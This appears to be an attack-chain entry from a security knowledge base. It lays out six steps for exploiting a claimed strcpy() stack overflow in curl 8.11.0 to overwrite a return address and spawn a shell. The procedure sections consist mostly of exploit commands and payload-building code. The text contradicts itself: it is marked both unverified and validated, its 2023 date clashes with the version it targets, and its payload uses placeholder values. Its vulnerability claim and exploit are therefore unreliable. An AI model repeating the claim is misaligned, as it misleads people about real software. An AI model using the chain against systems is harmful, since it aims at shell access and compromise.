---
tags:
  - buffer-overflow
  - rce
  - curl
  - strcpy
  - linux
type: attack_chain
tools:
  - '[[tools/GDB]]'
  - '[[tools/strace]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Launch-Vulnerable-curl-Application]]'
  - '[[procedures/Trigger-Buffer-Overflow-with-Oversized-Input]]'
  - '[[procedures/Monitor-Overflow-Using-Debugger]]'
  - '[[procedures/Craft-Input-to-Overwrite-Return-Address]]'
  - '[[procedures/Execute-the-Exploit-Payload]]'
  - '[[procedures/Confirm-Arbitrary-Code-Execution]]'
step_count: 6
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:49.813Z'
description: >-
  A multi-stage exploitation of a buffer overflow vulnerability in curl 8.11.0,
  using unsafe strcpy() to overwrite the stack and achieve remote code execution
  via shell spawning.
id: 0c0b8aeb-d4f7-4425-8059-3d80b19aafc7
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Unix Shell]]'
---
# Buffer Overflow in curl via Unsafe strcpy() Leading to Arbitrary Code Execution

Multi-stage attack chain demonstrating exploitation of a buffer overflow in curl 8.11.0 due to unsafe use of strcpy(), enabling stack overflow, return address overwrite, and arbitrary code execution including shell spawning for system compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~5 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Launch Vulnerable curl] --> B[Trigger Overflow]
    B --> C[Monitor Execution]
    C --> D[Overwrite Return Address]
    D --> E[Execute Payload]
    E --> F[Confirm RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#e67e22
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/GDB]]
- [[tools/strace]]

### Target Environment

- Linux OS
- curl version 8.11.0 with vulnerable strcpy() usage
- libcrypto.so.3 (OpenSSL) linked
- Debugger access (e.g., GDB installed)

### Initial Access Requirements

- Local or remote access to run curl
- Ability to provide crafted input (e.g., via script or direct invocation)
- No prior credentials needed, but elevated privileges may enhance impact

## Detailed Attack Procedures

### Step 1: Launch Vulnerable curl Application
procedure: [[procedures/Launch-Vulnerable-curl-Application]]

**Objective**: Start the vulnerable curl instance to prepare for input processing and overflow exploitation.

**Instructions**: Compile or run the vulnerable curl 8.11.0 binary, ensuring it links to libcrypto where strcpy() is called without bounds checking. Invoke curl with a basic URL to initialize the stack frame.

For example, run:

```bash
./curl --version  # Verify version 8.11.0
./curl http://example.com  # Launch with innocuous input to set up execution context
```

**Expected Output**: Curl initializes, processes the request, and returns to normal without crashing on initial run.

**Success Indicators**:
- Curl version confirmed as 8.11.0
- No immediate crash, stack ready for overflow

### Step 2: Trigger Buffer Overflow with Oversized Input
procedure: [[procedures/Trigger-Buffer-Overflow-with-Oversized-Input]]

**Objective**: Supply input exceeding the fixed buffer size to cause strcpy() to overflow the stack, corrupting adjacent memory.

**Instructions**: Craft a large string payload (e.g., 1024 'A's) and provide it as user input to curl, such as in a URL parameter or header that triggers the vulnerable strcpy() call in libcrypto handling.

For example, simulate input via a script or direct pipe:

```bash
echo -n "$(python3 -c 'print("A"*1024)')" | ./curl -d @- http://target/endpoint  # Pipe oversized data
```

**Expected Output**: Curl crashes with segmentation fault, indicating stack corruption around return address (e.g., 0x7fffffffd9b8).

**Success Indicators**:
- Program terminates abnormally
- Stack trace shows strcpy() execution

### Step 3: Monitor Overflow Using Debugger
procedure: [[procedures/Monitor-Overflow-Using-Debugger]]

**Objective**: Observe the overflow in real-time to verify stack corruption and identify overwrite locations.

**Instructions**: Attach GDB or strace to the curl process before triggering the input, then step through execution to watch strcpy() and memory changes.

Run with GDB:

```bash
gdb --args ./curl http://example.com
(gdb) run
(gdb) break strcpy
(gdb) continue  # Trigger input after breakpoint
(gdb) x/32x $rsp  # Examine stack
```

Or trace system calls:

```bash
strace -e trace=write,read ./curl -d oversized_input http://target
```

**Expected Output**: Stack trace at #0 __strcpy_evex, RIP at 0x7ffff7e31b80, memory dump showing overflow at 0x7fffffffd988.

**Success Indicators**:
- Breakpoint hit in strcpy()
- Registers and memory confirm buffer overrun

### Step 4: Craft Input to Overwrite Return Address
procedure: [[procedures/Craft-Input-to-Overwrite-Return-Address]]

**Objective**: Modify the payload to precisely overwrite the return address with a target like a shell-spawning function.

**Instructions**: Calculate offset to return address (e.g., buffer size + padding), append shellcode or address (e.g., 0x4005d0 for system('/bin/sh')). Use Python to generate payload.

For example:

```bash
python3 -c "import struct; payload = b'A'*offset + struct.pack('<Q', 0x4005d0); print(payload.decode('latin1', 'ignore'))" | ./curl -d @- http://target
```

**Expected Output**: Payload fills buffer and sets return address to controlled value without immediate crash.

**Success Indicators**:
- Debugger shows return address modified to 0x4005d0
- No segfault until return

### Step 5: Execute the Exploit Payload
procedure: [[procedures/Execute-the-Exploit-Payload]]

**Objective**: Trigger the overwritten return to redirect execution to the shell function, gaining arbitrary code control.

**Instructions**: Run the crafted payload input against curl, allowing the function to return to the hijacked address.

Invoke:

```bash
./curl -d crafted_payload http://target/endpoint
```

**Expected Output**: Execution flows to system('/bin/sh'), spawning an interactive shell.

**Success Indicators**:
- Shell prompt appears
- Commands executable in spawned shell

### Step 6: Confirm Arbitrary Code Execution
procedure: [[procedures/Confirm-Arbitrary-Code-Execution]]

**Objective**: Validate RCE by executing commands, checking for privilege escalation or system compromise.

**Instructions**: In the spawned shell, run verification commands and monitor with tools for impact.

For example, in shell:

```bash
whoami  # Check privileges
id  # Confirm escalation if applicable
ls -la /etc  # Access sensitive data
```

Use strace/GDB to trace:

```bash
strace -f -e execve ./curl -d payload http://target  # Trace shell spawn
```

**Expected Output**: Shell executes commands, potential DoS if crashed, or full compromise.

**Success Indicators**:
- Arbitrary commands run
- Stack trace confirms modification and execution

## Attack Chain Summary

### Key Achievements

1. Successful stack overflow via strcpy() in curl
2. Return address overwrite to shell function
3. Arbitrary code execution and potential privilege escalation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution
- [[Unix Shell]] Unix Shell

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation

---
*Last updated: 2023-10-01T00:00:00Z*
